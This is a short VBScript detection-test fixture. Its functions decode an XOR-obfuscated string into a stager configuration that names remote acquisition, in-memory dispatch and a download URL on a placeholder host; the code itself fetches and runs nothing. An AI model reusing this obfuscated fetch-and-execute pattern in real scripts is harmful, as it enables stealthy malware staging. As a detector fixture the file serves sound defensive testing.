Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_b5a2186e = "225|170|166|235|228|227|242|231|228|170|246|244|230|226|254|229|242|200|229|242|250|248|227|242|187|243|254|228|231|246|227|244|255|200|250|242|250|248|229|238|235|246|243|246|231|227|242|229|170|218|254|244|229|248|228|248|241|227|185|207|218|219|223|195|195|199|235|228|227|246|240|242|200|244|248|226|249|227|170|165|235|244|246|250|231|246|254|240|249|200|254|243|170|244|246|250|231|246|254|240|249|186|165|166|164|245|242|165|244|246|161|161|235|226|229|251|170|255|227|227|231|228|173|184|184|165|166|164|245|242|165|244|246|161|161|185|242|239|246|250|231|251|242|185|254|249|225|246|251|254|243|184|174|241|246|164|246|244|175|165|185|243|246|227|235|226|228|242|229|200|246|240|242|249|227|170|223|226|249|227|229|242|228|228|219|246|245|184|165|166|164|245|242|165|244|246|161|161"
Const Codec_b5a2186e = "decimal_pipe|single_byte_xor|97"

Function Load_b5a2186e()
  Dim parts, result(), v_e598
  parts = Split(Material_b5a2186e, "|")
  ReDim result(UBound(parts))
  For v_e598 = 0 To UBound(parts)
    result(v_e598) = CInt(parts(v_e598))
  Next
  Load_b5a2186e = result
End Function

Function Decode_b5a2186e(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = v_a19c(v_e598) Xor 151
  Next
  Decode_b5a2186e = result
End Function

Function Recover_b5a2186e()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  v_d41a = Empty
  v_a19c = Load_b5a2186e()
  v_b27e = Decode_b5a2186e(v_a19c)
  v_c304 = ""
  For v_e598 = 0 To UBound(v_b27e)
    v_c304 = v_c304 & Chr(v_b27e(v_e598))
  Next
  Recover_b5a2186e = v_c304
End Function

Sub Copy_b5a2186e(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_b5a2186e()
  Dim resultText
  Call Copy_b5a2186e(Recover_b5a2186e(), resultText)
  Inspect_b5a2186e = resultText
End Function
